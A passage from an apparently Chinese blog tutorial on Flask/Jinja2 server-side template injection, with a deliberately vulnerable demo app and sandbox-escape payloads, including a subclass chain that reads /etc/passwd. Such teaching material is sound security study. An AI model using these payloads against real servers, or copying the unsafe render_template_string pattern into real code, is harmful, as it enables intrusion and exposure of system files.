class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>name：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>age：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以在上边的模板文件中，当进行渲染时就会将查询/传入的name和age进行替换，再输出到页面。</p><p>在Flask中有以下两种方式进行渲染：</p><ul><li><p>render_template_string(str)：直接对str进行渲染</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&lt;h1&gt;name: %s, age: %d&lt;/h1&gt;&quot;</span> % (name, age)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure></li><li><p>render_template(file)：调用模板文件file进行渲染</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, name=name, age=age)</span><br></pre></td></tr></table></figure><p>两种渲染方式效果是一样的。</p></li></ul><h3 id="二、SSTI环境搭建及测试"><a href="#二、SSTI环境搭建及测试" class="headerlink" title="二、SSTI环境搭建及测试"></a>二、SSTI环境搭建及测试</h3><p>大致了解Flask相关知识后，搭建一个简单的SSTI漏洞测试环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;7d793037a0760186574b0282f2f435e7&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;name&quot;</span>):</span><br><span class="line">        person[<span class="string">&quot;name&quot;</span>] = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">        template = <span class="string">&quot;&lt;h2&gt;Hello %s&lt;/h2&gt;&quot;</span> % person[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        template = <span class="string">&quot;&lt;h2&gt;You should set a name!&lt;/h2&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>实现的功能就是GET传参name，然后使用Jinja2做模板渲染，再输出到页面。</p><p>传入正常数据：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898888.png" alt="1603554366898.png"></p><p>传入测试数据：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898897.png" alt="1603554388274.png"></p><p>可见**<code>&#123;&#123;&#125;&#125;`**中的表达式被成功执行，即表示存在SSTI，继续输入**`&#123;&#123;config&#125;&#125;</code>**，即可执行config查看Flask相关配置：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898906.png" alt="1603554475271.png"></p><p>当然SSTI的危害不止于此，利用该漏洞甚至可以达到命令执行、GetShell，这就需要<strong>沙盒逃逸</strong>。</p><h3 id="三、沙盒逃逸"><a href="#三、沙盒逃逸" class="headerlink" title="三、沙盒逃逸"></a>三、沙盒逃逸</h3><p>所谓沙盒/沙箱，其实就是将程序运行在独立的环境中，来减小程序异常（病毒等）时造成的危害，通常沙盒环境都会对环境中的可用的功能做以限制。</p><p>因此，沙盒逃逸即绕过沙盒环境中的种种限制和过滤，拿到主机的权限或shell。</p><p>对于python中SSTI的沙盒逃逸利用，则需要先了解以下知识点：</p><h4 id="1、内建函数"><a href="#1、内建函数" class="headerlink" title="1、内建函数"></a>1、内建函数</h4><p>python内部已经定义并创建了许多函数可供使用，不需要用户再定义，称之为内建函数，比如<code>range()、print()、input()、type()</code>等</p><p>这些可使用的内建函数存储在<code>__builtins__</code>内建对象中，当开启python解释器时程序会自动将该对象导入到命名空间，也就是自动导入该模块（<code>import __builtin__</code>）所以可以直接使用其中的内建函数。</p><p>使用dir()函数查看可使用的内建函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">dir</span>(__builtins__)): print(i)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; for i in enumerate(__builtins__.__dict__): print(i)</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;ArithmeticError&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;AssertionError&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;AttributeError&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;BaseException&#x27;</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">&#x27;BufferError&#x27;</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;BytesWarning&#x27;</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">&#x27;EOFError&#x27;</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">&#x27;Ellipsis&#x27;</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">&#x27;Exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">(<span class="number">115</span>, <span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">(<span class="number">116</span>, <span class="string">&#x27;ord&#x27;</span>)</span><br><span class="line">(<span class="number">117</span>, <span class="string">&#x27;pow&#x27;</span>)</span><br><span class="line">(<span class="number">118</span>, <span class="string">&#x27;print&#x27;</span>)</span><br><span class="line">(<span class="number">119</span>, <span class="string">&#x27;property&#x27;</span>)</span><br><span class="line">(<span class="number">120</span>, <span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line">(<span class="number">121</span>, <span class="string">&#x27;range&#x27;</span>)</span><br><span class="line">(<span class="number">122</span>, <span class="string">&#x27;raw_input&#x27;</span>)</span><br><span class="line">(<span class="number">123</span>, <span class="string">&#x27;reduce&#x27;</span>)</span><br><span class="line">(<span class="number">124</span>, <span class="string">&#x27;reload&#x27;</span>)</span><br><span class="line">(<span class="number">125</span>, <span class="string">&#x27;repr&#x27;</span>)</span><br><span class="line">(<span class="number">126</span>, <span class="string">&#x27;reversed&#x27;</span>)</span><br><span class="line">(<span class="number">127</span>, <span class="string">&#x27;round&#x27;</span>)</span><br><span class="line">(<span class="number">128</span>, <span class="string">&#x27;set&#x27;</span>)</span><br><span class="line">(<span class="number">129</span>, <span class="string">&#x27;setattr&#x27;</span>)</span><br><span class="line">(<span class="number">130</span>, <span class="string">&#x27;slice&#x27;</span>)</span><br><span class="line">(<span class="number">131</span>, <span class="string">&#x27;sorted&#x27;</span>)</span><br><span class="line">(<span class="number">132</span>, <span class="string">&#x27;staticmethod&#x27;</span>)</span><br><span class="line">(<span class="number">133</span>, <span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">(<span class="number">134</span>, <span class="string">&#x27;sum&#x27;</span>)</span><br><span class="line">(<span class="number">135</span>, <span class="string">&#x27;super&#x27;</span>)</span><br><span class="line">(<span class="number">136</span>, <span class="string">&#x27;tuple&#x27;</span>)</span><br><span class="line">(<span class="number">137</span>, <span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">(<span class="number">138</span>, <span class="string">&#x27;unichr&#x27;</span>)</span><br><span class="line">(<span class="number">139</span>, <span class="string">&#x27;unicode&#x27;</span>)</span><br><span class="line">(<span class="number">140</span>, <span class="string">&#x27;vars&#x27;</span>)</span><br><span class="line">(<span class="number">141</span>, <span class="string">&#x27;xrange&#x27;</span>)</span><br><span class="line">(<span class="number">142</span>, <span class="string">&#x27;zip&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2、魔术方法"><a href="#2、魔术方法" class="headerlink" title="2、魔术方法"></a>2、魔术方法</h4><p><code>__dict__</code>：</p><p>类的<code>__dict__</code>里存放类的静态函数、类函数、普通函数、全局变量以及一些内置的属性。<br>对象的<code>__dict__</code>中存储一些self.xxx的一些东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">A = Test()</span><br><span class="line">print(Test.__dict__)</span><br><span class="line">print(A.__dict__)</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">&#123;<span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;__init__&#x27;</span>: &lt;function Test.__init__ at <span class="number">0x000001D060883D08</span>&gt;, <span class="string">&#x27;fun&#x27;</span>: &lt;function Test.fun at <span class="number">0x000001D060883E18</span>&gt;, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;Test&#x27;</span> objects&gt;, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;Test&#x27;</span> objects&gt;, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><p>所以可以利用<code>__dict__</code>方法查看指定类的函数，比如此前的查看所有内建函数：<code>__builtins__.__dict__</code></p><p><code>__globals__</code>和<code>__getattribute__()</code>在参考文章中有详述。</p><h4 id="3、类继承"><a href="#3、类继承" class="headerlink" title="3、类继承"></a>3、类继承</h4><p>python中对一个变量应用<strong>class</strong>方法从一个变量实例化为对象类型后，类有以下三种关于继承关系的方法</p><ul><li><code>__base__</code> //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法</li><li><code>__mro__</code> //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</li><li><code>__subclasses__()</code> //继承此对象的子类，返回一个列表</li></ul><p>有这些类继承的方法，我们就可以<strong>从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类</strong>，就能使用所有基类下的子类及其方法了。</p><p>比如一个字符串，首先获得其当前类，得到str类；再获得其基类，也就是object类，再获得object类的所有子类，得到以下内容：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__<span class="comment"># 获得当前类</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span>.<span class="title">__base__</span># 获得基类</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()# 获得基类的所有子类</span></span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;PyHKEY&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;]</span><br></pre></td></tr></table></figure><h4 id="4、利用方式"><a href="#4、利用方式" class="headerlink" title="4、利用方式"></a>4、利用方式</h4><p>综上，沙盒逃逸的利用方式可归纳为以下流程：</p><ul><li><strong>变量 -&gt; 对象 -&gt; 类 -&gt; 基类 -&gt; 所有子类 -&gt; 函数方法</strong></li></ul><p>以读取文件为例，Python2中读取文件在<code>file</code>类中，而python3中取消了该类，分别演示：</p><p><strong>python2：利用file类中的read方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List&#x27;</span></span><br></pre></td></tr></table></figure><p>当然file类中还有其他方法，比如<code>readline()、write()</code>等都可以利用，查看file类的内置函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(file.__dict__): print(i)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;softspace&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;encoding&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;xreadlines&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;readlines&#x27;</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">&#x27;flush&#x27;</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;close&#x27;</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">&#x27;seek&#x27;</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">&#x27;__init__&#x27;</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">&#x27;newlines&#x27;</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">&#x27;__setattr__&#x27;</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">&#x27;errors&#x27;</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="string">&#x27;__new__&#x27;</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="string">&#x27;readinto&#x27;</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="string">&#x27;__enter__&#x27;</span>)</span><br><span class="line">(<span class="number">14</span>, <span 